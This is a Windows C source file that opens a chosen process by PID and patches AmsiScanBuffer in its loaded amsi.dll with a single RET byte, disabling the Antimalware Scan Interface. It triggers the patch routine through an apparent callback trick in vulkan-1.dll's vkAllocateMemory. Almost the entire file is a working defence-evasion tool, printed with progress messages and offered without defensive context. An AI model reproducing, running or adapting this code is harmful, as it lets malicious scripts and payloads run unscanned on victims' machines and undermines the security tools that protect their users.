#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <amsi.h>
#include <psapi.h>

#define MAGIC 0x10ADED040410ADEDULL

typedef HRESULT (WINAPI *PFN_AmsiScanBuffer)(
    HAMSICONTEXT amsiContext, PVOID buffer, ULONG length,
    LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT *result
);

typedef struct {
    uint64_t p, m, _1, _2, _3, _4, _5, _6, _7;
} EG_STR;

typedef __int64 (__fastcall *PFN_Thunk)(__int64 *a1);

HANDLE target = NULL;

__int64 __fastcall cb_patch(__int64 *a1) {
    (void)a1;
    printf("[+] VK* API patching AMSI...\n");
    
    HMODULE amsi = LoadLibraryW(L"amsi.dll");
    PFN_AmsiScanBuffer scan = (PFN_AmsiScanBuffer)GetProcAddress(amsi, "AmsiScanBuffer");
    uintptr_t offset = (uintptr_t)scan - (uintptr_t)amsi;
    
    HMODULE tgt = NULL;
    HMODULE mods[1024];
    DWORD cb;
    EnumProcessModules(target, mods, sizeof(mods), &cb);
    for (size_t i = 0; i < (cb / sizeof(HMODULE)); i++) {
        wchar_t name[MAX_PATH];
        GetModuleBaseNameW(target, mods[i], name, sizeof(name) / sizeof(wchar_t));
        if (_wcsicmp(name, L"amsi.dll") == 0) { tgt = mods[i]; break; }
    }
    
    uintptr_t addr = (uintptr_t)tgt + offset;
    printf("[+] Patching at: 0x%llx\n", addr);
    
    DWORD old;
    VirtualProtectEx(target, (LPVOID)addr, 1, PAGE_EXECUTE_READWRITE, &old);
    unsigned char ret = 0xC3;
    WriteProcessMemory(target, (LPVOID)addr, &ret, 1, NULL);
    VirtualProtectEx(target, (LPVOID)addr, 1, old, &old);
    
    printf("[+] AMSI patched!\n");
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 2) { printf("Usage: %s <PID>\n", argv[0]); return -1; }
    
    DWORD pid = (DWORD)strtoul(argv[1], NULL, 10);
    printf("[+] Targeting PID: %lu\n", pid);
    
    target = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    EG_STR ex = {0};
    ex.p = (uint64_t)&ex.m;
    ex.m = MAGIC;
    ex._7 = (uint64_t)(void*)&cb_patch;
    
    HMODULE vulk = LoadLibraryW(L"vulkan-1.dll");
    PFN_Thunk vk = (PFN_Thunk)GetProcAddress(vulk, "vkAllocateMemory");
    
    printf("[+] VK* API loaded, patching AMSI...\n");
    vk((__int64*)&ex);
    
    printf("[+] Done\n");
    CloseHandle(target);
    return 0;
}
